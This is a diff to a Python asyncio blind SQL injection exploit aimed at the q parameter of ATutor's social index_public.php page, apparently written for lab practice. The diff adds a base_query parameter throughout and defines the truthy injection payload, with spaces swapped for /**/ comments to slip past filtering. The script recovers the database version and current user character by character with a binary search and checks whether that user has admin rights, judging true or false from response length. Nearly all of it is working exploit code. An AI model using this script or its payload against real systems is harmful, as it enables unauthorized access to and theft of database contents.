@@ -1,4 +1,5 @@
 import asyncio
+from email.mime import base
 from urllib import response
 from collections.abc import Callable
 import aiohttp
@@ -32,11 +33,11 @@ async def run_until_found(tasklist: List):
     map(lambda x: x.cancel(), tasks)
     return response
 
-async def blind_query(session:aiohttp.client.ClientSession,  response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
-                      url:str, sub_query:str, ordinal:str = "",
+async def blind_query(session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
+                      url:str, base_query:Callable[[str],str], sub_query:str, ordinal:str = "",
                       query_encoder:Callable[[str], str]=None, debug:bool=False
                       ):
-    target = query_encoder(blind_sqli_truthy(url,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(url, sub_query, COMMENT)
+    target = query_encoder(base_query(url,sub_query, COMMENT)) if query_encoder else base_query(url, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -48,13 +49,13 @@ async def blind_query(session:aiohttp.client.ClientSession,  response_truth_cond
             return False
     except aiohttp.client_exceptions.ServerDisconnectedError:
         return False
-async def question(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
+async def question(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
-        return await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, sub_query=sub_query, query_encoder=query_encoder)
-async def get_length(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
+        return await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder)
+async def get_length(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_length = [
-            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['LENGTH_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
+            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['LENGTH_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         strlen = int(await run_until_found(cr_length))
@@ -63,10 +64,10 @@ async def get_length(url:str, sub_query: str, response_truth_condition:Callable[
         except:
             print(F"(+) Could not determine length of subquery [{sub_query}].")
             exit(1)
-async def get_count(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 0, upper_bound: int = 1000, query_encoder:Callable[[str], str]=None):
+async def get_count(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 0, upper_bound: int = 1000, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_count = [
-            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['COUNT_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
+            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['COUNT_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         count = int(await run_until_found(cr_count))
@@ -75,19 +76,19 @@ async def get_count(url:str, sub_query: str, response_truth_condition:Callable[[
         except:
             print(F"(+) Could not determine count of subquery [{sub_query}].")
             exit(1)
-async def binary_search(url:str, session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lo, hi, sub_query, position, query_encoder:Callable[[str], str]=None):
+async def binary_search(url:str, session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lo, hi, base_query:Callable[[str],str], sub_query, position, query_encoder:Callable[[str], str]=None):
     while lo <= hi:
         mid = lo + (hi - lo) // 2
-        res = await blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['STR_EXFIL'](sub_query,position,mid),ordinal=mid,query_encoder=query_encoder)
+        res = await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['STR_EXFIL'](sub_query,position,mid),ordinal=mid,query_encoder=query_encoder)
         if (res):
             lo = mid + 1
         else:
             hi = mid - 1
     return lo
-async def get_string(url:str, sub_query:str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], strlen: int, query_encoder:Callable[[str], str]=None):
+async def get_string(url:str, base_query:Callable[[str],str], sub_query:str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], strlen: int, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         tasks = [
-            binary_search(url=url, session=session, response_truth_condition=response_truth_condition, lo=32, hi=126, sub_query=sub_query, position=i, query_encoder=query_encoder)
+            binary_search(url=url, session=session, response_truth_condition=response_truth_condition, lo=32, hi=126, base_query=base_query, sub_query=sub_query, position=i, query_encoder=query_encoder)
             for i in range(1, strlen+1)
         ]
         s = list(await asyncio.gather(*tasks))
@@ -98,15 +99,15 @@ async def get_string(url:str, sub_query:str, response_truth_condition:Callable[[
         except:
             print(F"(+) Could not exfil string with subquery [{sub_query}].")
             exit(1)
-async def report(url:str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
-    version_strlen = await get_length(url,"select version()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
+async def report(url:str, base_query:Callable[[str],str], response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
+    version_strlen = await get_length(url, base_query=base_query, sub_query="select version()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
     print("(+) DB Version strlen: ", version_strlen)
-    print(F"(+) MySQL Version: {await get_string(url,'select version()', response_truth_condition=response_truth_condition, strlen=version_strlen, query_encoder=query_encoder)}")
-    db_user_strlen = await get_length(url,"select current_user()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
+    print(F"(+) MySQL Version: {await get_string(url, base_query=base_query, sub_query='select version()', response_truth_condition=response_truth_condition, strlen=version_strlen, query_encoder=query_encoder)}")
+    db_user_strlen = await get_length(url, base_query=base_query, sub_query="select current_user()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
     print("(+) Current DB User strlen: ", db_user_strlen)
-    db_user = await  get_string(url,"select current_user()", response_truth_condition=response_truth_condition, strlen=db_user_strlen, query_encoder=query_encoder)
+    db_user = await  get_string(url, base_query=base_query, sub_query="select current_user()", response_truth_condition=response_truth_condition, strlen=db_user_strlen, query_encoder=query_encoder)
     print(F"(+) Current DB User: {db_user}")
-    print(F"(+) Current User is DB Admin?: {await question(url, QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user),  response_truth_condition=response_truth_condition, query_encoder=query_encoder)}")
+    print(F"(+) Current User is DB Admin?: {await question(url, base_query=base_query, sub_query=QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user),  response_truth_condition=response_truth_condition, query_encoder=query_encoder)}")
     '''
     num_tables = await get_count(url, "SELECT COUNT(table_name) FROM information_schema.tables", query_encoder=query_encoder)
     print(num_tables)
@@ -126,8 +127,9 @@ def response_truth_condition(response):
     if (content_length == 180):
         return True
     return False
+blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
 try:
-    asyncio.run(report("http://atutor/ATutor/mods/_standard/social/index_public.php?q=",response_truth_condition=response_truth_condition, query_encoder=lambda s: s.replace(' ','/**/')))
+    asyncio.run(report("http://atutor/ATutor/mods/_standard/social/index_public.php?q=", base_query=blind_sqli_truthy,response_truth_condition=response_truth_condition, query_encoder=lambda s: s.replace(' ','/**/')))
 # https://github.com/MagicStack/uvloop/issues/349
 except NotImplementedError:
     pass
